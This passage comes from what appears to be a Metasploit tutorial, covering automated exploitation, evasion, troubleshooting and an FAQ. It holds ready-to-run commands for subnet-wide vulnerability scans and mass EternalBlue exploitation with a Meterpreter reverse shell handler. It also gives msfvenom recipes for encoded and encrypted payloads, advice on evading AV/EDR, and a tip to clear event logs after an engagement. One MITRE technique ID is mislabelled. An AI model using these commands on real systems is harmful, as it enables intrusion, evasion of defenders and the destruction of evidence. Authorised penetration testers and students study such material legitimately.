- **Burp Suite:** Web vulnerability scanning feeds into Metasploit exploitation

### Automation Workflows

```bash
# Automated penetration testing workflow
# 1. Reconnaissance and scanning
db_nmap -sV -O --script=vuln 192.168.1.0/24

# 2. Review discovered hosts and services
hosts -c address,name,os_name,purpose
services -c port,proto,name,info -p 445

# 3. Search for matching exploits
search type:exploit platform:windows smb ms17

# 4. Set up persistent handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
set ExitOnSession false
exploit -j

# 5. Automated exploitation
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS file:/tmp/hosts.txt
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit -z

# 6. Post-exploitation on each session
sessions -l
for each session:
  sessions -i <id> -c "sysinfo"
  sessions -i <id> -c "getuid"
```

---

## Chapter 7: OPSEC & Defense Evasion

### Payload Obfuscation Techniques

```bash
# Multiple encoding iterations
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -e x86/xor_dynamic \
  -i 20 \
  -f exe \
  -o payload_heavy_encoded.exe

# Use encryption
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  --encrypt aes256 \
  --iterations 5 \
  -f exe \
  -o payload_encrypted.exe

# Generate custom shellcode with format options
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f c \
  -v shellcode
```

### Handler OPSEC

```bash
# Use a specific local IP (avoid 0.0.0.0)
msf6 > set LHOST 192.168.1.100

# Use uncommon ports
msf6 > set LPORT 8443

# Disable exit on session
msf6 > set ExitOnSession false

# Use session logging
msf6 > set SessionLogOnly true
msf6 > set SessionLogging true
```

### Meterpreter Evasion
- **Memory injection:** Run Meterpreter inside legitimate processes via process migration
- **Encrypted communication:** Use HTTPS handlers for encrypted C2 channels
- **Sleep intervals:** Randomize beacon timing to avoid pattern detection
- **Traffic shaping:** Mimic legitimate network patterns (HTTP, DNS, ICMP)
- **Staged payloads:** Use stagers to minimize the initial footprint
- **Channel encryption:** Meterpreter sessions are encrypted by default

### Common Detection Methods
- Signature-based AV/EDR detection (encoded payloads are often still detected)
- Behavioral analysis (process injection, unusual network connections)
- AMSI (Antimalware Scan Interface) detection for script-based payloads
- ETW (Event Tracing for Windows) monitoring
- YARA rules for Meterpreter artifacts
- Network signatures (Snort, Suricata rules for Metasploit traffic)
- Sysmon detection for suspicious process creation and network connections

### Best Practices for Evasion
1. Always test payloads against AV/EDR before deployment
2. Use encryption and encoding on all payloads
3. Implement sleep jitter to avoid pattern detection
4. Use legitimate-looking domains and certificates for listeners
5. Monitor for detection and be prepared to adapt
6. Use staged payloads to minimize initial exposure
7. Migrate to legitimate processes after initial access
8. Clear event logs and artifacts after engagement

---

## Chapter 8: Troubleshooting & FAQ

### Common Issues

**Problem: Database not connecting**
```bash
# Check PostgreSQL status
sudo systemctl status postgresql

# Restart PostgreSQL
sudo systemctl restart postgresql

# Reinitialize the database
sudo msfdb reinit

# Verify database connection
msf6 > db_status
# Expected output: [*] postgresql connected to msf
```

**Problem: Exploit fails with "target appears not to be vulnerable"**
- Verify target is vulnerable using a vulnerability scanner (nmap scripts, Nessus)
- Check network connectivity and firewall rules
- Ensure payload is compatible with target architecture (x86 vs x64)
- Look for AV/EDR blocking the exploit
- Verify RHOSTS is set correctly

**Problem: Meterpreter session drops immediately**
```bash
# Increase session timeout
set SessionCommunicationTimeout 0
set SessionExpirationTimeout 3600

# Check network stability
ping -c 10 <target>

# Use a different payload type
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

**Problem: msfvenom payload detected by AV**
- Use different encoders (not just shikata_ga_nai)
- Apply multiple encoding iterations with different encoders
- Use custom obfuscation techniques
- Test against target defenses before deployment
- Consider using the Evasion module instead

**Problem: "No payload configured" error**
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
# If none listed, the exploit may not support your target platform
# Try a different exploit or manually set the payload
```

**Problem: "Already listening" port conflict**
```bash
# Find process using the port
sudo lsof -i :4444
# Kill the process or change the port
set LPORT 4445
```

**Problem: Handler doesn't receive connections**
- Verify the payload was generated with correct LHOST/LPORT
- Check firewall rules on the attacking machine
- Ensure the listener is accessible from the target
- Test with `telnet <attacker_ip> <lport>` from the target

### Performance Optimization
```bash
# Use database indexing for large engagements
msf6 > workspace -a production
msf6 > db_nmap -sV 10.0.0.0/8 --min-rate 1000 --max-retries 2

# Limit concurrent sessions
setg MaximumSessions 50
setg SessionLimit 25
```

### Debug Mode
```bash
# Enable verbose logging
setg LogLevel 3

# Check framework version
msf6 > version
# Output: Framework: 6.4.135-dev
# Console: 6.4.135-dev

# Update framework
sudo apt update && sudo apt install metasploit-framework

# Check module info
msf6 > info exploit/windows/smb/ms17_010_eternalblue

# Rebuild database indexes
msf6 > db_rebuild_cache
```

### FAQ

**Q: How many exploits are in Metasploit?**
A: The framework contains 2,500+ exploits, 900+ payloads, 600+ auxiliary modules, 400+ post-exploitation modules, 50+ encoders, and 50+ evasion modules.

**Q: Can I use Metasploit commercially?**
A: Yes. Rapid7 offers a commercial version (Metasploit Pro) with additional features including web interface, team collaboration, and automated reporting.

**Q: What's the difference between msfconsole and msfvenom?**
A: msfconsole is the interactive interface for the entire framework. msfvenom is a standalone payload generator that doesn't require the framework running.

**Q: How do I update Metasploit on Kali?**
A: Run `sudo apt update && sudo apt install metasploit-framework`. For daily updates, use `msfupdate`.

**Q: Can Metasploit work without a database?**
A: Yes, but you'll lose session tracking, host information, and service cataloging. Use `msfdb init` to set up the database.

---

## Resources

- **GitHub Repository:** https://github.com/rapid7/metasploit-framework
- **Kali Tools Page:** https://www.kali.org/tools/metasploit-framework/
- **Metasploit Documentation:** https://docs.metasploit.com/
- **Metasploit Unleashed (Free Course):** https://www.offsec.com/metasploit-unleashed/
- **Metasploit Payload Generation:** https://docs.metasploit.com/docs/development/payloads/
- **MITRE ATT&CK - Command and Control (TA0011):** https://attack.mitre.org/tactics/TA0011/
- **MITRE ATT&CK - Exploitation for Client Execution (T1203):** https://attack.mitre.org/techniques/T1203/
- **MITRE ATT&CK - Tool Transferred (T1572):** https://attack.mitre.org/techniques/T1572/
- **Related Tools:** Armitage, msfvenom, Meterpreter, PowerShell Empire, Havoc
- **Community Forums:** https://forums.metasploit.com/
- **Rapid7 Blog:** https://www.rapid7.com/blog/
